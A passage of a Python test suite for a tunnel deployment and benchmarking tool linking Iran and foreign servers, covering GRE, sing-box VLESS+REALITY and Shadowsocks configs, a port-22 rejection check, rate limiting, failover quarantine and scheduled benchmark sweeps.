            # Verify Foreign files are on mock_fr, and iran-exclusive files did not leak to mock_fr
            for fpath in plan.get("foreign_files", {}).keys():
                self.assertIn(fpath, mock_fr.state["files"], f"Foreign file {fpath} missing from Foreign runner for {proto}")
                if fpath not in plan.get("iran_files", {}):
                    self.assertNotIn(fpath, mock_ir.state["files"], f"Foreign file {fpath} leaked to Iran runner for {proto}")

            # Auditor Section 3-3 Host Dispatch Assertions:
            # 1) Every foreign unit must be active on fr_runner
            for u in plan.get("foreign_units", []):
                self.assertEqual(mock_fr.state.get("services", {}).get(u), "active", f"{proto}: foreign unit not active on foreign runner")
            # 2) And must NOT be started on ir_runner
            for u in plan.get("foreign_units", []):
                if u not in plan.get("iran_units", []):
                    self.assertNotIn(u, mock_ir.state.get("services", {}), f"{proto}: foreign unit must not exist on Iran")
            # 3) Symmetric for iran_units
            for u in plan.get("iran_units", []):
                self.assertEqual(mock_ir.state.get("services", {}).get(u), "active", f"{proto}: iran unit not active on iran runner")
                if u not in plan.get("foreign_units", []):
                    self.assertNotIn(u, mock_fr.state.get("services", {}), f"{proto}: iran unit must not exist on foreign")

    def test_15_production_and_benchmark_namespace_segregation(self):
        """A2 Acceptance Test: Deploys production tunnel, runs benchmark, and verifies benchmark teardown
        leaves production units and interfaces completely active and untouched."""
        pair_id = 99
        mock_pair = {
            "id": pair_id,
            "name": "test_segregation_pair",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")

        # 1. Deploy production GRE tunnel for pair 99
        res_prod = engine.deploy_tunnel(
            pair=mock_pair,
            choice="GRE",
            dry_run=False,
            force_confirmed=True,
            ir_runner=mock_ir,
            fr_runner=mock_fr
        )
        self.assertTrue(res_prod["ok"])
        prod_unit = f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-gre.service"
        self.assertIn(prod_unit, mock_ir.state["files"])
        self.assertEqual(mock_ir.state.get("services", {}).get(f"best-tunnel-prod-p{pair_id}-gre"), "active")

        # 2. Run isolated benchmark on pair 99 (uses namespace='bench')
        mock_ir.connected = True
        mock_fr.connected = True
        res_bench = engine.run_single_benchmark(
            pair=mock_pair,
            protocol="GRE",
            dry_run=False,
            ir_runner=mock_ir,
            fr_runner=mock_fr
        )
        self.assertFalse(res_bench["disqualified"])

        # 3. Verify Production tunnel unit and interface remained completely untouched!
        self.assertIn(prod_unit, mock_ir.state["files"], "Production unit file must NOT be deleted by benchmark teardown")
        self.assertEqual(mock_ir.state.get("services", {}).get(f"best-tunnel-prod-p{pair_id}-gre"), "active",
                         "Production unit must remain ACTIVE after benchmark teardown")

        # 4. Verify benchmark teardown only stopped/disabled bench unit
        bench_unit = f"best-tunnel-bench-p{pair_id}-gre"
        self.assertNotEqual(mock_ir.state.get("services", {}).get(bench_unit), "active",
                            "Benchmark unit must be stopped after benchmark completes")

    def test_16_api_testall_port_22_rejection(self):
        """A5 Acceptance Test 1: POST /api/testall with frontend=22 must be strictly rejected
        and NO pair must be created in the database."""
        class MockReq:
            def __init__(self, body_dict):
                self.body = json.dumps(body_dict).encode("utf-8")
                self.headers = {
                    "X-Best-Tunnel-CSRF": "1",
                    "Host": "127.0.0.1:8800",
                    "Content-Type": "application/json",
                    "Content-Length": str(len(self.body))
                }
                self.rfile = io.BytesIO(self.body)
                self.wfile = io.BytesIO()
                self.path = "/api/testall"
                self.response_code = None

            check_csrf = dashboard.H.check_csrf

            def send_response(self, code):
                self.response_code = code

            def send_header(self, k, v): pass
            def end_headers(self): pass

        # Attempt to auto-register pair with frontend port 22
        evil_payload = {
            "name": "ssh_lockout_attempt",
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22},
            "frontend": 22
        }
        handler = MockReq(evil_payload)
        dashboard.H.do_POST(handler)

        self.assertEqual(handler.response_code, 400)
        resp_data = json.loads(handler.wfile.getvalue().decode("utf-8"))
        self.assertFalse(resp_data.get("ok"))
        self.assertIn("Port 22 is hard-blacklisted", resp_data.get("error", ""))

        # Verify pair was NOT created in database
        all_pairs = storage.get_pairs()
        self.assertFalse(any(p.get("name") == "ssh_lockout_attempt" for p in all_pairs))

    def test_17_api_deploy_seeded_port_22_rejection(self):
        """A5 Acceptance Test 2: POST /api/deploy on a pair with frontend_port=22
        (directly seeded into DB) must be strictly rejected."""
        t_now = time.time()
        with storage.db_session() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO pairs (name, iran_host, foreign_host, iran_port, foreign_port, frontend_port, created_at, updated_at)
                VALUES ('seeded_ssh_pair', '198.51.100.10', '203.0.113.20', 22, 22, 22, ?, ?)
            """, (t_now, t_now))
            conn.commit()
            seeded_id = cur.lastrowid

        class MockReq:
            def __init__(self, body_dict):
                self.body = json.dumps(body_dict).encode("utf-8")
                self.headers = {
                    "X-Best-Tunnel-CSRF": "1",
                    "Host": "127.0.0.1:8800",
                    "Content-Type": "application/json",
                    "Content-Length": str(len(self.body))
                }
                self.rfile = io.BytesIO(self.body)
                self.wfile = io.BytesIO()
                self.path = "/api/deploy"
                self.response_code = None

            check_csrf = dashboard.H.check_csrf

            def send_response(self, code):
                self.response_code = code

            def send_header(self, k, v): pass
            def end_headers(self): pass

        deploy_payload = {
            "id": seeded_id,
            "choice": "GRE",
            "confirm_force_release": True,
            "override_active_users": True
        }
        handler = MockReq(deploy_payload)
        dashboard.H.do_POST(handler)

        self.assertEqual(handler.response_code, 400)
        resp_data = json.loads(handler.wfile.getvalue().decode("utf-8"))
        self.assertFalse(resp_data.get("ok"))
        self.assertIn("Port 22 is hard-blacklisted", resp_data.get("error", ""))

    def test_18_schema_version_and_migration_integrity(self):
        """Auditor Notice 1 / R-54 Acceptance Test: Sequential schema migrations with version tracking."""
        version = storage.get_schema_version()
        self.assertGreaterEqual(version, 4)

        with storage.db_session() as conn:
            cur = conn.execute("SELECT version, description FROM schema_version ORDER BY version ASC;")
            rows = cur.fetchall()
            versions_applied = [r[0] for r in rows]
            self.assertIn(1, versions_applied)
            self.assertIn(2, versions_applied)
            self.assertIn(3, versions_applied)
            self.assertIn(4, versions_applied)
            self.assertIn(5, versions_applied)
            self.assertIn(6, versions_applied)

            # Verify columns exist via column inspection
            bench_cols = storage.get_column_names(conn, "benchmarks")
            self.assertIn("throughput_mbps", bench_cols)
            self.assertIn("run_id", bench_cols)
            for leg_col in ("throughput_up_mbps", "throughput_down_mbps", "capacity_basis"):
                self.assertIn(leg_col, bench_cols,
                              f"the per-leg history is only auditable after the fact if the table keeps "
                              f"it: missing {leg_col}")

            pair_cols = storage.get_column_names(conn, "pairs")
            self.assertIn("base_rtt_ms", pair_cols)
            for dial_col in ("iran_dial_host", "foreign_dial_host"):
                self.assertIn(dial_col, pair_cols)

    def test_19_base_rtt_result_namedtuple_contract(self):
        """Auditor Notice 2 Acceptance Test: BaseRTTResult NamedTuple contract prevents signature drift."""
        mock_runner = mock_ssh.get_ssh_runner({"host": "127.0.0.1", "user": "root"}, dry_run=True)
        res = engine.measure_direct_base_rtt(mock_runner, "203.0.113.20", dry_run=True)

        self.assertIsInstance(res, engine.BaseRTTResult)
        self.assertIsInstance(res, tuple)
        self.assertEqual(res.base_rtt_ms, 42.0)
        self.assertTrue(res.is_fallback)

        # Ensure tuple unpacking works seamlessly
        rtt_val, is_fb = res
        self.assertEqual(rtt_val, 42.0)
        self.assertTrue(is_fb)

    def test_20_dashboard_profile_notes_and_rate_limiter(self):
        """Auditor Notice 3 & R-66 Acceptance Test: Centralized PROFILE_NOTES and Categorized IP Rate Limiter."""
        self.assertIn("ultraspeed_tooltip", dashboard.PROFILE_NOTES)
        self.assertIn("ultraspeed_label", dashboard.PROFILE_NOTES)
        self.assertIn("secrets_at_rest", dashboard.PROFILE_NOTES)
        self.assertIn(dashboard.PROFILE_NOTES["secrets_at_rest"], dashboard.PAGE)

        # Test sliding window rate limiter by category
        test_ip = "192.0.2.99"
        with dashboard.RATE_LIMIT_LOCK:
            dashboard.RATE_LIMIT_BUCKETS.pop((test_ip, "mutation"), None)
            dashboard.RATE_LIMIT_BUCKETS.pop((test_ip, "read"), None)
            dashboard.RATE_LIMIT_BUCKETS.pop((test_ip, "polling"), None)

        # Mutation quota: 30
        for _ in range(dashboard.RATE_LIMIT_QUOTAS["mutation"]):
            self.assertFalse(dashboard.is_rate_limited(test_ip, category="mutation"))
        self.assertTrue(dashboard.is_rate_limited(test_ip, category="mutation"))

        # Read quota: 60 (independent bucket)
        for _ in range(dashboard.RATE_LIMIT_QUOTAS["read"]):
            self.assertFalse(dashboard.is_rate_limited(test_ip, category="read"))
        self.assertTrue(dashboard.is_rate_limited(test_ip, category="read"))

    def test_21_singbox_adapter_vless_reality_generation(self):
        """Phase 2 Sprint 1 & 2 Acceptance Test: Declarative VLESS+REALITY Sing-Box generator."""
        plan = protocols.SingBoxAdapter.generate_vless_reality(
            pair_id=77,
            ir_ip="198.51.100.10",
            fr_ip="203.0.113.20",
            frontend=443,
            transport_port=2090,
            server_name="gateway.icloud.com"
        )
        self.assertEqual(plan["protocol"], "singbox-vless-reality")
        self.assertEqual(len(plan["iran_units"]), 1)
        self.assertEqual(len(plan["foreign_units"]), 1)
        self.assertIn("vless", plan["iran_units"][0])

        # Verify JSON validity for client and server
        client_cfg_file = [f for f in plan["iran_files"] if f.endswith(".json")][0]
        server_cfg_file = [f for f in plan["foreign_files"] if f.endswith(".json")][0]
        client_cfg = json.loads(plan["iran_files"][client_cfg_file])
        server_cfg = json.loads(plan["foreign_files"][server_cfg_file])

        self.assertTrue(protocols.SingBoxAdapter.validate_config(client_cfg))
        self.assertTrue(protocols.SingBoxAdapter.validate_config(server_cfg))

        # Check deep schema rejection on invalid configs
        bad_cfg = {"inbounds": [{"type": "invalid_inbound", "tag": "bad", "listen_port": 80}], "outbounds": [{"type": "direct", "tag": "d"}]}
        self.assertFalse(protocols.SingBoxAdapter.validate_config(bad_cfg))

        # Check VLESS outbound properties
        vless_out = [o for o in client_cfg["outbounds"] if o["type"] == "vless"][0]
        self.assertEqual(vless_out["server"], "203.0.113.20")
        self.assertEqual(vless_out["server_port"], 2090)
        self.assertTrue(vless_out["tls"]["enabled"])
        self.assertTrue(vless_out["tls"]["reality"]["enabled"])
        self.assertEqual(vless_out["tls"]["utls"]["fingerprint"], "chrome")

        # Check REALITY handshake camouflage server on server inbound
        vless_in = [i for i in server_cfg["inbounds"] if i["type"] == "vless"][0]
        self.assertEqual(vless_in["listen_port"], 2090)
        self.assertEqual(vless_in["tls"]["reality"]["handshake"]["server"], "gateway.icloud.com")
        self.assertEqual(vless_in["tls"]["reality"]["handshake"]["server_port"], 443)

        # Teardown guarantees
        self.assertTrue(any("rm -f" in cmd for cmd in plan["teardown_iran"]))
        self.assertTrue(any("rm -f" in cmd for cmd in plan["teardown_foreign"]))

    def test_22_singbox_adapter_shadowsocks_2022_generation(self):
        """Phase 2 Sprint 1 Acceptance Test: Declarative Shadowsocks-2022 Sing-Box generator."""
        plan = protocols.SingBoxAdapter.generate_shadowsocks_2022(
            pair_id=88,
            ir_ip="198.51.100.10",
            fr_ip="203.0.113.20",
            frontend=443,
            transport_port=8388,
            method="2022-blake3-aes-128-gcm"
        )
        self.assertEqual(plan["protocol"], "singbox-ss-2022")

        client_cfg_file = [f for f in plan["iran_files"] if f.endswith(".json")][0]
        server_cfg_file = [f for f in plan["foreign_files"] if f.endswith(".json")][0]
        client_cfg = json.loads(plan["iran_files"][client_cfg_file])
        server_cfg = json.loads(plan["foreign_files"][server_cfg_file])

        self.assertTrue(protocols.SingBoxAdapter.validate_config(client_cfg))
        self.assertTrue(protocols.SingBoxAdapter.validate_config(server_cfg))

        ss_out = [o for o in client_cfg["outbounds"] if o["type"] == "shadowsocks"][0]
        self.assertEqual(ss_out["method"], "2022-blake3-aes-128-gcm")
        self.assertEqual(ss_out["server_port"], 8388)
        self.assertTrue(len(ss_out["password"]) > 16)

    def test_23_iperf3_multistream_engine_wiring_and_integration(self):
        """Phase 2 Sprint 2 Acceptance Test: Multi-stream bidirectional iperf3 wiring, serial port 8898 handover, duration 10s.
        Senior Auditor Finding 3-1: Asserts that iperf3 connects through the tunnel if and only if Iran port forwarding is active."""
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")

        # 1. Negative assertion: Without active tunnel forwarding on Iran, iperf connection fails
        mock_ir.state["listeners"].pop(8898, None)
        res_fail = engine.measure_iperf3_throughput(mock_ir, mock_fr, "127.0.0.1", port=8898, duration=10)
        self.assertFalse(res_fail["available"])

        # 2. Positive assertion: With active tunnel forwarding on Iran, iperf succeeds across tunnel
        mock_ir.state["listeners"][8898] = "tunnel_client"
        res_ok = engine.measure_iperf3_throughput(mock_ir, mock_fr, "127.0.0.1", port=8898, duration=10)
        self.assertTrue(res_ok["available"])
        self.assertGreater(res_ok["download_mbps"], 0.0)
        self.assertGreater(res_ok["upload_mbps"], 0.0)
        self.assertGreater(res_ok["throughput_mbps"], 0.0)

        # 3. Verify benchmark integration with singbox-vless-reality
        mock_pair = {
            "id": 55,
            "name": "test_iperf_pair",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        bench_res = engine.run_single_benchmark(mock_pair, "singbox-vless-reality", dry_run=True)
        self.assertEqual(bench_res["protocol"], "singbox-vless-reality")
        self.assertIn("iperf3", bench_res)
        self.assertTrue(bench_res["iperf3"]["available"])
        self.assertGreater(bench_res["throughput_mbps"], 80.0)
        self.assertFalse(bench_res["disqualified"])

    def test_24_single_source_of_truth_and_opt_in_singbox(self):
        """Condition 4 Acceptance Test: Single source of truth for the protocol set.

        The sing-box half of this test was rewritten at graduation (2026-10-24):
        the protocols earned a live witness on the Iran/Turkey test pair, so the
        default set is all 11 and the toggle that remains is the operator's
        kill switch (BEST_TUNNEL_DISABLE_SINGBOX=1 re-quarantines).
        Hysteria2 graduated the same day (live witness over GRE + iperf),
        and spoof-wireguard joined the base gated 2026-10-29, so the base
        is 11 and the default set is 13.
        """
        # 1. Default state: graduated set. Asserted against the live resolver:
        #    protocols.SUPPORTED_PROTOCOLS is frozen at import time, so it reflects whatever the
        #    toggle was when the process started, not the state under test.
        os.environ.pop("BEST_TUNNEL_ENABLE_SINGBOX", None)
        os.environ.pop("BEST_TUNNEL_DISABLE_SINGBOX", None)
        active_protos = protocols.get_supported_protocols()
        # 11 base since hysteria2 graduated (a real overlay this product
        # builds and benchmarks, not a flag-gated experiment) and
        # spoof-wireguard joined gated, plus the 2 graduated sing-box
        # protocols.
        self.assertEqual(len(active_protos), 13)
        self.assertIn("ESP", active_protos)
        self.assertIn("GRE", active_protos)
        self.assertIn("hysteria2", active_protos)
        self.assertIn("spoof-wireguard", active_protos)
        self.assertIn("singbox-vless-reality", active_protos)
        self.assertIn("singbox-ss-2022", active_protos)
        self.assertTrue(set(active_protos).issubset(set(protocols.ALL_PROTOCOLS)))
        # The engine must resolve the set live, not from an import-time snapshot
        self.assertEqual(engine.get_supported_protocols(), active_protos)

        # 2. Kill switch: re-quarantined back to the base 11.
        os.environ["BEST_TUNNEL_DISABLE_SINGBOX"] = "1"
        try:
            reduced = protocols.get_supported_protocols()
            self.assertEqual(len(reduced), 11)
            self.assertEqual(reduced, protocols.BASE_PROTOCOLS)
            self.assertIn("hysteria2", reduced)
            self.assertNotIn("singbox-vless-reality", reduced)
            self.assertEqual(engine.get_supported_protocols(), reduced)
        finally:
            os.environ.pop("BEST_TUNNEL_DISABLE_SINGBOX", None)
        self.assertEqual(len(engine.get_supported_protocols()), 13)

    def test_134_singbox_graduation_is_real_for_the_selector(self):
        """Graduation is not a label: once sing-box is first-class, benchmark
        evidence for it must rank in failover like any other transport's -
        and the kill switch must remove it from candidacy again.
        """
        pid = storage.add_pair(name=f"grad_{int(time.time() * 1000)}",
                               iran_host="198.51.100.30", foreign_host="203.0.113.30",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.record_benchmark(pid, "singbox-ss-2022",
                                 {"score": 88.0, "capacity_basis": "measured",
                                  "disqualified": 0}, run_id="test_134")
        storage.record_benchmark(pid, "rathole-noise",
                                 {"score": 70.0, "capacity_basis": "measured",
                                  "disqualified": 0}, run_id="test_134")
        os.environ.pop("BEST_TUNNEL_DISABLE_SINGBOX", None)
        self.assertEqual(
            failover.FailoverCandidateSelector.select_best_candidate(pid, "chisel-wss"),
            "singbox-ss-2022",
            "a graduated protocol with the best evidence must be selectable")
        os.environ["BEST_TUNNEL_DISABLE_SINGBOX"] = "1"
        try:
            self.assertEqual(
                failover.FailoverCandidateSelector.select_best_candidate(pid, "chisel-wss"),
                "rathole-noise",
                "re-quarantined protocols must leave the candidate set")
        finally:
            os.environ.pop("BEST_TUNNEL_DISABLE_SINGBOX", None)

    def test_135_saturation_rides_the_monitor_pass_instead_of_a_second_session(self):
        """Phase 3 saturation wiring: the monitor samples the carrier
        interface's counters in the same pass (same runners, before they
        close) and reports capacity-relative load; a saturated pair warns
        without changing its verdict, and an unmeasured pair stays unknown
        rather than inventing an alert line.
        """
        class FakeRunner:
            def __init__(self, counters):
                self.counters = counters
                self.calls = 0

            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "statistics" in cmd:
                    rx, tx = self.counters[self.calls % len(self.counters)]
                    self.calls += 1
                    return 0, f"{rx}\n{tx}\n", ""
                return 0, "", ""

            def close(self):
                pass

        pid = storage.add_pair(name=f"sat_{int(time.time() * 1000)}",
                               iran_host="198.51.100.31", foreign_host="203.0.113.31",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.record_benchmark(pid, "rathole-noise",
                                 {"score": 77.0, "capacity_basis": "measured",
                                  "throughput_mbps": 20.0, "disqualified": 0},
                                 run_id="test_135")
        pair = {"id": pid, "active_tunnel": "rathole-noise",
                "iran": {"host": "198.51.100.31", "dial_host": "10.10.11.1"},
                "foreign": {"host": "203.0.113.31", "dial_host": "10.10.11.2"}}
        # 2,000,000 bytes over a 1 s window = 16 Mbps; capacity 20 -> 80% = high.
        sat = failover_monitor.sample_saturation(
            FakeRunner([(1000000, 2000000), (2000000, 3000000)]), pair, 1.0)
        self.assertEqual(sat["state"], "high")
        self.assertEqual(sat["pct"], 80.0)
        self.assertEqual(sat["iface"], f"grep{pid}")
        self.assertEqual(sat["capacity_mbps"], 20.0)

        # Same load against a bigger demonstrated capacity: ok, not high.
        storage.record_benchmark(pid, "backhaul-wss",
                                 {"score": 70.0, "capacity_basis": "measured",
                                  "throughput_mbps": 200.0, "disqualified": 0},
                                 run_id="test_135")
        pair2 = dict(pair, active_tunnel="backhaul-wss")
        sat2 = failover_monitor.sample_saturation(
            FakeRunner([(1000000, 2000000), (2000000, 3000000)]), pair2, 1.0)
        self.assertEqual(sat2["state"], "ok")
        self.assertEqual(sat2["pct"], 8.0)

        # No measured capacity at all: unknown, never a guessed percentage.
        pair3 = dict(pair, active_tunnel="kcptun")
        sat3 = failover_monitor.sample_saturation(
            FakeRunner([(1000000, 2000000), (2000000, 3000000)]), pair3, 1.0)
        self.assertEqual(sat3["state"], "unknown")
        self.assertIsNone(sat3["pct"])

        # A public pair (no carrier) has nothing to meter.
        pair4 = {"id": pid, "active_tunnel": "rathole-noise",
                 "iran": {"host": "198.51.100.31"},
                 "foreign": {"host": "203.0.113.31"}}
        self.assertIsNone(failover_monitor.sample_saturation(
            FakeRunner([(0, 0), (0, 0)]), pair4, 1.0))

    def test_136_benchmark_rows_carry_their_preflight_conditions(self):
        """Phase 3 preflight wiring: a live benchmark measures the path and
        the hosts once, before any bench tunnel is written, and the row
        carries those conditions - so a score is read next to what it was
        measured under, not as a bare number. Dry runs stay deterministic
        and carry no preflight. Findings are advisory: they never gate
        the measurement itself.
        """
        pair = {"id": 99, "frontend": 9443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}
        ir_m = mock_ssh.MockSSHClient(host_role="iran")
        fr_m = mock_ssh.MockSSHClient(host_role="foreign")
        row = engine.run_single_benchmark(pair, "rathole-noise", dry_run=False,
                                          ir_runner=ir_m, fr_runner=fr_m, base_rtt=41.2)
        self.assertIn("preflight", row, "a live row must carry its preflight report")
        self.assertIsInstance(row["preflight"]["findings"], list)
        # Mock hosts answer nothing to the fact collectors, so the honest
        # finding is unreachable - and the benchmark still scored.
        self.assertTrue(any("could not be collected" in f
                            for f in row["preflight"]["findings"]),
                        f"mock hosts must read as uncollectable, not healthy: {row['preflight']}")
        self.assertFalse(row["disqualified"],
                         "advisory findings must not disqualify a measurement")

        dry = engine.run_single_benchmark(pair, "rathole-noise", dry_run=True,
                                          ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                          fr_runner=mock_ssh.MockSSHClient(host_role="foreign"),
                                          base_rtt=41.2)
        self.assertNotIn("preflight", dry,
                         "dry runs are deterministic simulations and must not grow new keys")

    def test_137_auto_mode_remembers_its_winner_and_never_flip_flops(self):
        """Phase 3 auto mode: a pair in 'auto' follows median benchmark
        evidence, remembers the winner, and only proposes a move when the
        challenger leads by the margin - a 1-point wobble is not a reason
        to pay a switchover blackout. Manual pairs are untouched.
        """
        pid = storage.add_pair(name=f"auto_{int(time.time() * 1000)}",
                               iran_host="198.51.100.32", foreign_host="203.0.113.32",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        # Default steering is manual, and no winner is remembered yet.
        row = storage.get_pair(pid)
        self.assertEqual(row.get("mode"), "manual")
        self.assertEqual(row.get("auto_protocol"), "")
        self.assertFalse(storage.set_pair_mode(pid, "sideways"),
                         "an unknown mode must be refused, not stored")

        def seed(proto, score):
            storage.record_benchmark(pid, proto,
                                     {"score": score, "capacity_basis": "measured",
                                      "disqualified": 0}, run_id="test_137")

        seed("rathole-noise", 70.0)
        seed("backhaul-wss", 88.0)
        self.assertTrue(storage.set_pair_mode(pid, "auto"))
        winner, margin = failover.auto_winner(pid, "rathole-noise")
        self.assertEqual(winner, "backhaul-wss")
        self.assertAlmostEqual(margin, 18.0)
        self.assertEqual(failover.refresh_auto_choice(pid, "rathole-noise"),
                         "backhaul-wss")
        self.assertEqual(storage.get_pair(pid).get("auto_protocol"), "backhaul-wss")

        # A challenger 1 point ahead is inside the margin: stay.
        seed("backhaul-wss", 71.0)
        seed("backhaul-wss", 71.0)
        winner2, margin2 = failover.auto_winner(pid, "rathole-noise")
        self.assertEqual(winner2, "rathole-noise")
        self.assertLess(margin2, failover.AUTO_SWITCH_MARGIN)

        # No evidence at all: auto cannot choose, and must say so.
        fresh = storage.add_pair(name=f"auto_fresh_{int(time.time() * 1000)}",
                                 iran_host="198.51.100.33", foreign_host="203.0.113.33",
                                 frontend_port=9443)
        self.addCleanup(storage.delete_pair, fresh)
        self.assertEqual(failover.auto_winner(fresh, "rathole-noise"), (None, 0.0))

        # The selector still agrees with the shared sample (no divergence
        # between the heal path and the auto path on the same evidence).
        self.assertEqual(
            failover.FailoverCandidateSelector.select_best_candidate(pid, "rathole-noise"),
            "backhaul-wss")

    def test_138_failover_quarantine_restores_instead_of_redeploying(self):
        """Phase 3 failover quarantine: a switchover stops the old
        transport but does not delete it, so a successor that fails its
        smoke check is rolled back by re-enabling units - not by a
        redeploy. A successful switchover keeps the fallback until its
        grace expires, when purge finally runs the stored teardown.
        """
        class RecRunner:
            def __init__(self, mock):
                self.mock = mock
                self.commands = []

            def run(self, cmd, **kw):
                self.commands.append(cmd)
                return self.mock.run(cmd, **kw)

            def write_file(self, path, content):
                return self.mock.write_file(path, content)

            def close(self):
                return self.mock.close()

        pid = storage.add_pair(name=f"quar_{int(time.time() * 1000)}",
                               iran_host="198.51.100.34", foreign_host="203.0.113.34",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "frontend": 9443,
                "iran": {"host": "198.51.100.34", "port": 22},
                "foreign": {"host": "203.0.113.34", "port": 22}}
        old_plan = protocols.generate_deployment("rathole-noise", pid,
                                                 "198.51.100.34", "203.0.113.34", 9443)
        ir_svc = old_plan["iran_units"][0]
        fr_svc = old_plan["foreign_units"][0]

        def fresh_runners():
            ir_m = mock_ssh.MockSSHClient(host_role="iran")
            fr_m = mock_ssh.MockSSHClient(host_role="foreign")
            ir_m.state["services"][ir_svc] = "active"
            fr_m.state["services"][fr_svc] = "active"
            ir_m.state["files"][f"/etc/systemd/system/{ir_svc}.service"] = "unit"
            fr_m.state["files"][f"/etc/systemd/system/{fr_svc}.service"] = "unit"
            return RecRunner(ir_m), RecRunner(fr_m)

        # A. Success: old units stopped, teardown NOT run, record kept.
        ir_r, fr_r = fresh_runners()
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=99)
        res = mgr.execute_failover(pair, "rathole-noise", "chisel-wss",
                                   reason="test", dry_run=True,
                                   ir_runner=ir_r, fr_runner=fr_r)
        self.assertTrue(res["success"], f"mock switchover must succeed: {res}")
        self.assertIsNotNone(res.get("quarantined"))
        rec = storage.get_quarantine(pid)
        self.assertIsNotNone(rec, "a successful switchover must leave a quarantine record")
        self.assertEqual(rec["protocol"], "rathole-noise")
        all_cmds = ir_r.commands + fr_r.commands
        self.assertTrue(any(f"systemctl stop {ir_svc}" in c for c in all_cmds),
                        "quarantine stops the old units")
        for td in old_plan["teardown_iran"] + old_plan["teardown_foreign"]:
            self.assertNotIn(td, all_cmds,
                             "quarantine must not run the old transport's teardown")

        # B. Smoke failure: restore runs, pair returns to the old protocol.
        ir_r2, fr_r2 = fresh_runners()
        ir_r2.mock.state["units_die_after_start"] = True
        fr_r2.mock.state["units_die_after_start"] = True
        mgr2 = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=99)
        res2 = mgr2.execute_failover(pair, "rathole-noise", "chisel-wss",
                                     reason="test", dry_run=True,
                                     ir_runner=ir_r2, fr_runner=fr_r2)
        self.assertFalse(res2["success"])
        self.assertTrue(res2.get("restored"),
                        "a failed successor must restore the quarantined transport")
        all_cmds2 = ir_r2.commands + fr_r2.commands
        self.assertTrue(any(f"systemctl enable --now {ir_svc}" in c for c in all_cmds2),
                        "restore re-enables the old Iran unit")
        self.assertTrue(any(f"systemctl enable --now {fr_svc}" in c for c in all_cmds2),
                        "restore re-enables the old foreign unit")
        self.assertIsNone(storage.get_quarantine(pid),
                          "a restored quarantine is consumed, not left behind")
        row = storage.get_pair(pid)
        self.assertEqual(row.get("active_tunnel"), "rathole-noise")
        self.assertEqual(row.get("status"), "ACTIVE")

        # C. Purge: an expired record's teardown runs; a live one is kept.
        storage.record_quarantine(pid, "chisel-wss", old_plan, -1.0)
        ir_r3, fr_r3 = fresh_runners()
        self.assertTrue(mgr.purge_quarantine(pair, dry_run=True,
                                             ir_runner=ir_r3, fr_runner=fr_r3),
                        "an expired quarantine must purge")
        self.assertIsNone(storage.get_quarantine(pid))
        all_cmds3 = ir_r3.commands + fr_r3.commands
        self.assertTrue(any(td in all_cmds3 for td in old_plan["teardown_iran"]),
                        "purge runs the stored teardown")
        storage.record_quarantine(pid, "chisel-wss", old_plan, 600.0)
        self.assertFalse(mgr.purge_quarantine(pair, dry_run=True,
                                              ir_runner=fresh_runners()[0],
                                              fr_runner=fresh_runners()[1]),
                         "a live quarantine must not purge early")
        storage.clear_quarantine(pid)

    def test_139_scheduled_sweeps_keep_the_ranking_current(self):
        """Phase 3 scheduled benchmarks: the scheduler re-sweeps ACTIVE
        pairs on its interval (skipping the rest, never dying on one
        pair's failure, never running while the hosts are held), and an
        auto pair's remembered winner follows the fresh evidence.
        """
        import benchmark_scheduler

        pid = storage.add_pair(name=f"sched_{int(time.time() * 1000)}",
                               iran_host="198.51.100.35", foreign_host="203.0.113.35",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, "ACTIVE", "rathole-noise")
        storage.set_pair_mode(pid, "auto")
        storage.record_benchmark(pid, "rathole-noise",
                                 {"score": 70.0, "capacity_basis": "measured",
                                  "disqualified": 0}, run_id="test_139")
        storage.record_benchmark(pid, "backhaul-wss",
                                 {"score": 88.0, "capacity_basis": "measured",
                                  "disqualified": 0}, run_id="test_139")

        calls = []

        def fake_sweep(pair, dry_run=True, profile="balanced", run_id=""):
            calls.append(pair["id"])
            return [{"protocol": "rathole-noise", "score": 70.0},
                    {"protocol": "backhaul-wss", "score": 88.0}]

        class Guard:
            def __init__(self):
                self.held = []

            def acquire(self, hosts):
                self.held.append(tuple(hosts))
                return True

            def release(self, hosts):
                pass

        guard = Guard()
        sched = benchmark_scheduler.BenchmarkScheduler(
            policy=benchmark_scheduler.BenchmarkPolicy(interval_hours=24.0),
            pair_source=lambda: [
                {"id": pid, "active_tunnel": "rathole-noise", "mode": "auto",
                 "status": "ACTIVE",
                 "iran": {"host": "198.51.100.35"}, "foreign": {"host": "203.0.113.35"}},
                {"id": 999001, "active_tunnel": "rathole-noise", "mode": "manual",
                 "status": "NEW",
                 "iran": {"host": "198.51.100.36"}, "foreign": {"host": "203.0.113.36"}},
            ],
            host_guard=guard, dry_run=True, sweep_fn=fake_sweep)
        results = sched.run_once()
        self.assertEqual(calls, [pid],
                         "only ACTIVE pairs are swept, whatever the source hands over")
        self.assertEqual(len(guard.held), 1)
        self.assertEqual(results[0]["action"], "SWEPT")
        self.assertEqual(results[0]["auto_winner"], "backhaul-wss")
        self.assertEqual(results[1]["action"], "SKIP_NOT_ACTIVE")
        self.assertEqual(storage.get_pair(pid).get("auto_protocol"), "backhaul-wss")

        # active_pairs_from_storage really does filter to ACTIVE pairs.
        storage.update_pair_status(pid, "NEW")
